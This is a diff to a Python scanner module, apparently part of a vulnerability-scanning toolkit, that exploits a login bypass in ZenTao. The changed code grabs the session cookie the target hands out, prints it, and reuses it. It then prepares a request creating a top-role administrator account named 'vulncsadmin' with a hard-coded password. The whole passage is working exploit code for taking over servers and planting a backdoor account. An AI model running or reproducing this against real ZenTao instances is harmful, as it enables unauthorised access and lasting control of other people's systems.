@@ -12,9 +12,14 @@ class ZenTao_Login_Bypass_Scan:
             cookie = response.headers.get("Set-Cookie",False)
             if cookie and "zentaosid" in cookie:
                 OutPrintInfoSuc("ZenTao", f"目标存在漏洞:{base_url}")
+                cookie = response.headers.get("Set-Cookie")
+                if ";" in response.headers.get("Set-Cookie"):
+                    cookie = response.headers.get("Set-Cookie").split(";")[0]
+                if not self.batch:
+                    OutPrintInfo("ZenTao", f'Cookie: {cookie}')
                 headers = {
                     "User-Agent": self.headers["User-Agent"],
-                    "Cookie": response.headers.get("Set-Cookie") + "; path=/zentao/; HttpOnly",
+                    "Cookie": cookie,
                     "Content-type": "application/json"
                 }
                 data = {"account": "vulncsadmin", "password": "vulncs@admin", "realname": "vulncsadmin", "role": "top", "group": "1"}
